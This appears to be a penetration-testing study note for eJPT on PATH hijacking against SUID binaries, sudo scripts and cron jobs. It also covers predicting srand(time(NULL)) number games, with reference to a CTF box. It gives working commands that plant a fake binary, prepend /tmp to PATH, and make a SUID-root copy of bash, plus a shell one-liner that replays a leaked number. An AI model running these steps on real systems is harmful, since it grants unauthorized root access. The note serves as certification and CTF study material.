---
type: technique
tags: [ejpt:host-net-pentest]
tools: []
cves: []
related: ["[[suid-enumeration]]", "[[sudo-abuse]]"]
---

# PATH Hijacking

Exploiting a privileged process that invokes a command by **name** (not absolute path), so it resolves through the attacker-controlled `PATH`.

## When it works

- A **SUID binary** calls `system("uname -p")` (relative) instead of `/usr/bin/uname`.
- A **sudo'd script** or **cron job** runs a bare command name.

`system()` runs `/bin/sh -c "<cmd>"`, which looks up `<cmd>` in `PATH`. If you control `PATH`, you control what runs — and it runs **with the caller's privileges** (root, in the SUID case).

## Exploit

1. Plant a malicious binary:

   ```sh
   printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\n' > /tmp/evil
   chmod +x /tmp/evil
   ```

2. Put its directory first in `PATH`:

   ```sh
   export PATH=/tmp:$PATH
   ```

3. Trigger the privileged process → it executes `/tmp/evil` as root.

## Companion: predictable PRNG

Some SUID challenges gate the command behind a *"guess the number"* game seeded by `srand(time(NULL))`. The seed is the current **second**, so it's predictable:

- **Reveal + re-run** — run once (wrong guess reveals the number), re-run in the *same second* with that number (seed unchanged):

  ```sh
  reveal=$(/path/to/binary 2>&1 <<< "1")
  num=$(echo "$reveal" | grep -oE '[0-9]+' | tail -1)
  /path/to/binary <<< "$num"
  ```

- Or replicate `srand(time(NULL))` + `rand()` in a helper to predict it in one shot.

## Seen in

[[madeyes-castle]] (SUID `swagger` → `system("uname -p")` + `srand(time(NULL))` guess-the-number)
